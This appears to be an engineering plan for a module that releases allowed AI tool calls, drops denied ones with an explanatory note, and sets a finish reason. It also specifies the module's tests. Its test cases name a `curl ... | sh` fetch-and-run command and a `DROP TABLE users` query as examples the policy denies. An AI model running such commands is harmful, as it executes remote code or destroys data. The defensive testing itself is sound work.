---
story: STORY-009
prd: PRD-017
slug: tool-release
title: "tool_release.apply_decisions: release allowed calls, drop denied ones with a note, finish_reason"
type: NEW_CAPABILITY
complexity: LOW
epic_branch: epic/PRD-017-tool-calling
created: 2026-11-16
---

# Plan: tool_release.apply_decisions

## Summary

A new pure module `app/services/tool_release.py` turns one response's tool calls and their
`ActionDecision`s (from `action_policy.evaluate_all`, same order) into a frozen `Release`:
the `allow` and `flag` calls (the same `ToolCallSpec` objects, in model order), one note per
`deny` built from a module-constant template with the model's `name` and `id` cut to 64
characters and PRD-016's `reason` inserted unchanged, and a `finish_reason` (`"tool_calls"`
if any call is released, `"stop"` if every call was denied, `None` when there were no calls,
meaning "keep the upstream's"). Mismatched lengths, a `tool_call_id` that does not equal the
call's `id` at the same position, or a decision value outside `allow`/`flag`/`deny` raise
`ValueError`: a programming error, never a silent release. The same module owns the one
Section 6.6 content-joining helper, `content_with_notes(content, notes)`, so STORY-010 (the
pipeline, after step 8 redaction) and STORY-011/012 (response shapes) call one function. No
caller is wired in this story. Tests go in a new `tests/test_tool_release.py`, including the
module's purity and import-graph checks.

## User Story

As an integrating developer
I want a denied tool call removed and explained in a sentence while my allowed calls still go through
So that one denial costs me one call and my agent can report why

## Story Reference

- Story file: `.agents/stories/PRD-017-tool-calling/STORY-009-tool-release.md`
- PRD: `.agents/PRDs/PRD-017-tool-calling/PRD.md` (Section 6.6 is the spec: lines 230-246)

## Metadata

| Field | Value |
|-------|-------|
| Type | NEW_CAPABILITY |
| Complexity | LOW |
| Systems Affected | `app/services/tool_release.py` (new, pure), `tests/test_tool_release.py` (new) |
| Story | STORY-009 |
| PRD | PRD-017 |
| Epic Branch | `epic/PRD-017-tool-calling` (commit directly on this branch) |

---

## Skills In Use

| Skill | Why it applies | Tasks affected |
|-------|---------------|----------------|
| (none) | `.agents/skills/` holds only `frontend-design` (UI design guidance). This story has no UI; story frontmatter `skills: []`. | none |

---

## Design decisions

- **D-1: Public names.** `Release`, `apply_decisions`, `content_with_notes`, and two module
  constants `DENIAL_NOTE_TEMPLATE = "[harness] tool call {name} ({id}) was denied: {reason}"`
  and `NOTE_FIELD_CAP = 64`. Public (not `_`-prefixed) because the story asks for one source
  that STORY-018's docs and the E2E assertions (STORY-015/016/017) cite. Mirrors
  `action_policy._NAME_DETAIL_CAP = 64` (`app/services/action_policy.py:158-160`), which is
  the same cut for the same reason (model-chosen strings).
- **D-2: Joining helper lives here.** `content_with_notes(content: str, notes: Sequence[str]) -> str`
  returns `"\n\n".join(filter(None, [content, *notes]))`, verbatim from PRD 6.6 (line 244).
  `""` with no notes stays `""`; mapping `""` to `null` is STORY-011's (PRD 6.6 line 246).
  STORY-010 calls it after step 8 redaction so notes are never masked; STORY-011/012 do not
  re-join. Taking `notes` (not a `Release`) keeps it usable from either side.
- **D-3: Matching decisions to calls.** By position, then `decision.tool_call_id == call.id`
  at each index. Upstream ids can repeat across rounds, but STORY-004 refuses duplicate ids
  within one response, so position plus id equality is sufficient; no dict lookup. The check
  catches both a length mismatch and a reordered (or foreign) decision list (AC4).
  `ActionDecision.tool_call_id` is `""` only when `call.id` was not a string
  (`action_policy.py:89-90,282`); `ToolCallSpec.id` is a `str`, so a real pair always matches.
- **D-4: Unknown decision value fails loudly.** A decision outside `allow`/`flag`/`deny` raises
  `ValueError` rather than falling into either branch (T1: no call is released undecided). The
  vocabulary is written as a local frozenset literal (`frozenset({"allow", "flag", "deny"})`)
  rather than importing `action_classifiers.DECISIONS`, so the module's only runtime `app`
  import stays `app.models.messages` (see D-6). A test pins the literal equal to
  `action_classifiers.DECISIONS` so the two cannot drift (mirrors the
  `ToolCallSpec`/`ToolCall` alignment test, `tests/test_messages.py:302-306`).
- **D-5: `finish_reason` with no calls.** `apply_decisions((), ())` returns
  `Release((), (), None)`. `None` means "no opinion; the upstream's stands", which is PRD 6.6's
  "otherwise the upstream's as today" (line 245) and why the field is `Optional[str]`
  (line 239). With one or more calls: any released -> `"tool_calls"`, none -> `"stop"`.
- **D-6: Imports.** Runtime: `dataclasses`, `typing`, and `from app.models.messages import
  ToolCallSpec`. `ActionDecision` under `if TYPE_CHECKING:` only, annotated as the string
  `"ActionDecision"`, as `action_policy` does for `Identity` (`action_policy.py:64,70-71,262`).
  So importing `tool_release` loads exactly `app`, `app.models`, `app.models.messages`,
  `app.services`, `app.services.tool_release` (all `__init__.py` files are empty), which a
  subprocess test asserts. No settings, no I/O, no logging, no clock.
- **D-7: Error messages name the location and the rule, never a value** (PRD-015 T6/T9; brief).
  E.g. `"apply_decisions: 2 calls but 1 decisions; one decision per call, in order"`,
  `"apply_decisions: decisions[1].tool_call_id does not match calls[1].id; decisions must be in call order"`,
  `"apply_decisions: decisions[0].decision is not allow, flag or deny"`. Counts and indexes are
  fine; ids, names and decided values are not printed.
- **D-8: No copying.** Released entries are the input `ToolCallSpec` objects (`is` identity);
  `arguments` is never touched (D13). Inputs may be any `Sequence`; outputs are tuples.

### Deviation from the story's Technical Notes

The story says "Add `tool_release` to the purity/import-graph test that covers
`action_policy` etc. (find it in `tests/test_action_*.py`)". No such shared test exists. Each
module carries its own purity test in its own file: `tests/test_action_policy.py:663-685`
(`test_action_policy_stays_pure`, source scan + exact `app` import list),
`tests/test_action_adapters.py:701-736` (source scan + subprocess `sys.modules` check),
`tests/test_messages.py:601-627` and `tests/test_v1_translate_request.py:322-349`
(AST-based import set + forbidden-name set). Following that reality, the purity and
import-graph tests for `tool_release` go in `tests/test_tool_release.py`, combining the AST
form (robust to the docstring saying "no settings, no logging") with the subprocess
`sys.modules` form. No existing test file is edited. Report this to the orchestrator.

---

## Patterns to Follow

### Naming / module docstring citing PRD sections and decisions
```
# SOURCE: app/services/action_policy.py:1, 44-53
"""The decision engine: one tool call and one identity in, allow / flag / deny out (PRD-016 Sections 4, 6.2, 6.4, 6.7).
...
Purity (Section 6.12): this module names no `settings`, opens no file and
touches no database. ...
```

### Frozen dataclass with `#:` field comments
```
# SOURCE: app/services/action_policy.py:76-110
@dataclass(frozen=True)
class ActionDecision:
    """The outcome for one tool call (PRD-016 Section 6.2), plus what STORY-015 records.
    ...
    #: `call.id`; `""` when it is not a string.
    tool_call_id: str
```

### TYPE_CHECKING-only import, string annotation
```
# SOURCE: app/services/action_policy.py:64, 70-71, 260-264
from typing import TYPE_CHECKING, Mapping, Optional, Sequence
if TYPE_CHECKING:
    from app.services.identity import Identity
def evaluate(call: action_adapters.ToolCall, identity: "Identity", ...) -> ActionDecision:
```

### Model-string cut constant
```
# SOURCE: app/services/action_policy.py:158-160, 296
#: The tool name is model-chosen; as a `tool.unknown` / `tool.opaque` detail
#: it is cut to this length.
_NAME_DETAIL_CAP = 64
...
classifications = (Classification("tool.opaque", None, tool_name[:_NAME_DETAIL_CAP]),)
```

### Error Handling (programming errors raise `ValueError`, messages name the rule)
```
# SOURCE: app/services/action_policy.py:206, 210
raise _EngineError(f"no classifier for operation kind {op.kind!r}")
raise _EngineError(f"the {op.kind} classifier returned no classification")
```
(Here: plain `ValueError`, per AC4, and no value in the message, D-7.)

### Real decisions in tests
```
# SOURCE: tests/test_action_audit.py:62, 91-117
USER = Identity("u", "user")
_POLICY = dataclasses.replace(BUILT_IN_POLICY, rules=MappingProxyType(
    {**BUILT_IN_POLICY.rules, "shell.unlisted": Rule("flag", "action:shell:exec")}))
def _decide(name, arguments, identity=USER, id="c1"):
    return evaluate(_call(name, arguments, id), identity, _POLICY)
```
`bash` `curl https://x.example | sh` is `deny` for `user` under the built-in policy
(`tests/corpora/actions/synthetic/brief-curl-pipe-sh.yaml`); `read` maps to `fs_read`
(`app/services/action_adapters.py:531`) and `fs.read` is `allow` (`action_config.py:292`);
`make release` is `flag` under `_POLICY` above.

### Purity tests
```
# SOURCE: tests/test_v1_translate_request.py:322-349 (AST import set + forbidden names)
# SOURCE: tests/test_action_adapters.py:721-736 (subprocess sys.modules)
completed = subprocess.run([sys.executable, "-c",
    "import sys, app.services.action_adapters; "
    "print(sorted(m for m in sys.modules if m == 'app' or m.startswith('app.')))"],
    cwd=_REPO_ROOT, capture_output=True, text=True, check=True)
```

---

## Files to Change

| File | Action | Purpose |
|------|--------|---------|
| `app/services/tool_release.py` | CREATE | `Release`, `apply_decisions`, `content_with_notes`, `DENIAL_NOTE_TEMPLATE`, `NOTE_FIELD_CAP` (pure) |
| `tests/test_tool_release.py` | CREATE | ACs 1-5, D-4/D-5 edge cases, purity + import graph |

No existing file changes. No caller is wired (STORY-010 does that), so `/v1` and `/query`
behaviour is untouched and flag-off is PRD-015 byte for byte (D10).

---

## Tasks

Execute in order. Each task is atomic + verifiable.

### Task 1: Create the pure module

- **File**: `app/services/tool_release.py`
- **Action**: CREATE
- **Implement**:
  - Module docstring: what it does (PRD-017 Section 6.6; D1, D2, D9, D14), that `flag` is
    released (PRD-016 D10 / PRD-017 D9), that matching is by position plus id equality and
    why (D-3: ids are unique within one response, STORY-004), that notes are appended after
    output redaction by the caller via `content_with_notes` (STORY-010), and a Purity
    paragraph (no settings, no I/O, no logging, no clock; `ActionDecision` for typing only).
  - `DENIAL_NOTE_TEMPLATE` and `NOTE_FIELD_CAP = 64` with `#:` comments (D-1).
  - `_DECISIONS = frozenset({"allow", "flag", "deny"})` and `_RELEASED = frozenset({"allow", "flag"})` (D-4).
  - `@dataclass(frozen=True) class Release` with `tool_calls: tuple[ToolCallSpec, ...]`,
    `notes: tuple[str, ...]`, `finish_reason: Optional[str]`, each with a `#:` comment
    copied in meaning from PRD 6.6 lines 236-240.
  - `apply_decisions(calls: Sequence[ToolCallSpec], decisions: Sequence["ActionDecision"]) -> Release`:
    1. `len(calls) != len(decisions)` -> `ValueError` (D-7 message).
    2. For each index: `decision.tool_call_id != call.id` -> `ValueError`;
       `decision.decision not in _DECISIONS` -> `ValueError`. Validate **all** pairs before
       building anything, so a bad list never yields a partial release.
    3. Released = `call` where decision in `_RELEASED`; note for `deny`:
       `DENIAL_NOTE_TEMPLATE.format(name=call.name[:NOTE_FIELD_CAP], id=call.id[:NOTE_FIELD_CAP], reason=decision.reason)`.
       Use the call's `name`/`id` (the model's strings, PRD 6.6 line 243); `reason` unchanged.
    4. `finish_reason = None if not calls else ("tool_calls" if released else "stop")` (D-5).
  - `content_with_notes(content: str, notes: Sequence[str]) -> str` (D-2), docstring citing
    PRD 6.6 and noting `""` -> `null` is STORY-011's.
- **Mirror**: `app/services/action_policy.py:1-59` (docstring style), `:76-110` (frozen dataclass), `:64,70-71` (TYPE_CHECKING), `:158-160` (64 cut).
- **Validate**: `.venv/Scripts/python -c "from app.main import app; print('OK')"` and
  `.venv/Scripts/python -c "import app.services.tool_release as t; print(t.NOTE_FIELD_CAP)"`

### Task 2: Tests

- **File**: `tests/test_tool_release.py`
- **Action**: CREATE
- **Implement** (module docstring citing PRD-017 Section 6.6 and STORY-009; real decisions
  from `action_policy.evaluate` with an explicit policy where the reason text matters,
  hand-built `ActionDecision`s via a small helper where only the decision value or id
  matters, e.g. `dataclasses.replace(real_decision, decision=..., tool_call_id=...)`):
  - AC1: `[read, bash curl|sh]` with real decisions `[allow, deny]` (`call_1`, `call_2`):
    `release.tool_calls == (read_spec,)` and `release.tool_calls[0] is read_spec`,
    arguments byte-identical; `release.notes == (f"[harness] tool call bash (call_2) was denied: {deny.reason}",)`;
    `finish_reason == "tool_calls"`. Also assert the literal template string equals
    `DENIAL_NOTE_TEMPLATE` (one source for docs/E2E).
  - AC2a: every call denied (two deny calls, e.g. `bash curl|sh` and `query DROP TABLE users`):
    `tool_calls == ()`, two notes in model order, `finish_reason == "stop"`.
  - AC2b: a `flag` decision (`bash make release` under the `_POLICY` override): released,
    `notes == ()`, `finish_reason == "tool_calls"`. Mixed allow/flag/deny keeps model order.
  - AC3: `name` and `id` of 65+ characters (and one of exactly 64) -> each cut to 64 in the
    note; `reason` equals `decision.reason` verbatim (assert `note.endswith(": " + reason)`
    equivalently `note == template.format(...)`), including a reason that contains `{`, `}`
    and a colon, to prove it is inserted unchanged (no double formatting).
  - AC4: lengths differ (2 calls, 1 decision; 1 call, 2 decisions) -> `ValueError`;
    swapped order (decisions for `[call_2, call_1]` given calls `[call_1, call_2]`) ->
    `ValueError`; assert the message names the index and the rule and does not contain the
    ids (D-7). A list with one bad pair after a good one raises (no partial release).
  - D-4: a decision value outside the vocabulary (`dataclasses.replace(d, decision="maybe")`)
    -> `ValueError`; and `tool_release._DECISIONS == action_classifiers.DECISIONS` as a set.
  - D-5: `apply_decisions((), ())` -> `Release((), (), None)`; also accepts lists.
  - `Release` is frozen (`dataclasses.FrozenInstanceError`) with fields
    `["tool_calls", "notes", "finish_reason"]` in that order.
  - AC5: `content_with_notes("hi", ())` -> `"hi"`; `("", ())` -> `""`;
    `("", ("n1", "n2"))` -> `"n1\n\nn2"`; `("hi", ("n1",))` -> `"hi\n\nn1"`; and equality with
    `"\n\n".join(filter(None, [c, *n]))` over a small parametrized set.
  - Purity (AST, mirror `tests/test_v1_translate_request.py:322-349`): imported modules
    `<= {"dataclasses", "typing", "app.models.messages", "app.services.action_policy"}`, and
    `app.services.action_policy` appears only inside the `if TYPE_CHECKING:` block (walk the
    tree: every top-level `ImportFrom` of an `app.` module is `app.models.messages`); no name
    in `{"settings", "open", "logging", "logger", "httpx", "time", "datetime", "os"}`.
  - Import graph (subprocess, mirror `tests/test_action_adapters.py:721-736`): importing
    `app.services.tool_release` loads exactly
    `["app", "app.models", "app.models.messages", "app.services", "app.services.tool_release"]`
    (so neither `app.config` nor `action_policy` is loaded).
- **Mirror**: `tests/test_action_audit.py:62-117` (identities, policy override, `_decide`),
  `tests/test_action_adapters.py:37,721-736`, `tests/test_v1_translate_request.py:322-349`.
- **Validate**: `PYTHONUTF8=1 .venv/Scripts/python -m pytest tests/test_tool_release.py -q`

---

## End-to-End Tests

No endpoint changes in this story (no caller yet). Checks for `/implement`:

- [ ] `.venv/Scripts/python -c "from app.main import app; print('OK')"` prints `OK`.
- [ ] Targeted run, one pytest call:
  `PYTHONUTF8=1 .venv/Scripts/python -m pytest tests/test_tool_release.py tests/test_action_policy.py tests/test_messages.py -q`
  (the new file plus the two modules it builds on, to confirm nothing there changed; no app
  file outside the new module is touched, so `test_untouched_app.py` is not required, but
  include it if the implementer touches anything else). Full suite: deferred to orchestrator.

---

## Validation

```bash
.venv/Scripts/python -c "from app.main import app; print('OK')"
PYTHONUTF8=1 .venv/Scripts/python -m pytest tests/test_tool_release.py tests/test_action_policy.py tests/test_messages.py -q
```

---

## Risks

- **Template drift between code, docs and E2E.** Mitigation: one public constant, a test that
  pins its literal text (D-1).
- **`reason` containing braces.** `str.format` substitutes values once and does not re-parse
  them, so braces in `reason` are safe; a test proves it (AC3).
- **Purity test brittleness from docstrings.** Mitigation: AST-based checks, not substring
  scans (the reason `tests/test_messages.py:621-627` uses AST).
- **Later stories wanting a different `finish_reason` for no calls.** Documented as D-5;
  STORY-010/011 keep the upstream's when `Release.finish_reason is None`.

---

## Acceptance Criteria

(Copied from story `STORY-009`)

- [ ] Given calls `[read, bash-curl-sh]` decided `[allow, deny]`, when `apply_decisions` runs, then `Release.tool_calls == (read,)` (the same `ToolCallSpec` object, unmodified), one note `[harness] tool call bash (call_2) was denied: <reason>`, `finish_reason == "tool_calls"`.
- [ ] Given every call denied, then `tool_calls == ()`, one note per call in model order, `finish_reason == "stop"`; given a `flag` decision, then the call is released (D9) and no note is written.
- [ ] Given a model-chosen `name` or `id` longer than 64 characters, when the note is built, then each is cut to 64; `reason` is PRD-016's `ActionDecision.reason`, inserted unchanged.
- [ ] Given `calls` and `decisions` of different lengths or out of order (by `tool_call_id`), when called, then `ValueError` (a programming error, never a silent release).
- [ ] Given a content string and the notes, when the PRD Section 6.6 joining helper runs, then `content = "\n\n".join(filter(None, [content, *notes]))`, and `""` with no notes stays `""` (the result translator maps it to `null`, STORY-011).
- [ ] All tasks completed
- [ ] Backend imports without error (`from app.main import app`)
- [ ] Follows existing patterns
